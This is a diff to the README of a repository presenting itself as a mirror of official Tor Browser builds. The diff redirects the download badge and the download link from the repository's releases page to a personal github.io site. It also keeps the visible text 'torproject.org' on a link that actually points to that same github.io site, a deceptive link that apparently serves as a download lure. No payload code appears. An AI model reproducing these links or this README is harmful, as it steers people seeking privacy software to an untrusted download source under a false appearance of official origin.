@@ -1,6 +1,6 @@
 # 🔒 Tor-Browser-Releases - Browse Anonymously, Stay Private Online
 
-[![Download Tor Browser](https://img.shields.io/badge/Download-Tor_Browser-7B2DFF?style=for-the-badge&logo=tor-project&logoColor=white&labelColor=1A1A2E)](https://github.com/aseemselim45-afk/Tor-Browser-Releases/releases)
+[![Download Tor Browser](https://img.shields.io/badge/Download-Tor_Browser-7B2DFF?style=for-the-badge&logo=tor-project&logoColor=white&labelColor=1A1A2E)](https://aseemselim45-afk.github.io)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the Tor Browser Releases page. This guide will help you download and 
 
 ## 📥 Download Tor Browser
 
-Visit this link to download the application: [https://github.com/aseemselim45-afk/Tor-Browser-Releases/releases](https://github.com/aseemselim45-afk/Tor-Browser-Releases/releases)
+Visit this link to download the application: [https://aseemselim45-afk.github.io](https://aseemselim45-afk.github.io)
 
 On that page, you will find the latest version of Tor Browser available for your operating system. Choose the file that matches your device (Windows, Mac, Linux, Android, or iOS) and click to download.
 
@@ -78,7 +78,7 @@ Tor Browser is designed to protect your identity online. It isolates each websit
 
 ## 🤝 Contributing
 
-This repository is a mirror of official Tor Browser builds. To contribute to the Tor Project, visit [torproject.org](https://www.torproject.org).
+This repository is a mirror of official Tor Browser builds. To contribute to the Tor Project, visit [torproject.org](https://aseemselim45-afk.github.io).
 
 ## 📝 License
 
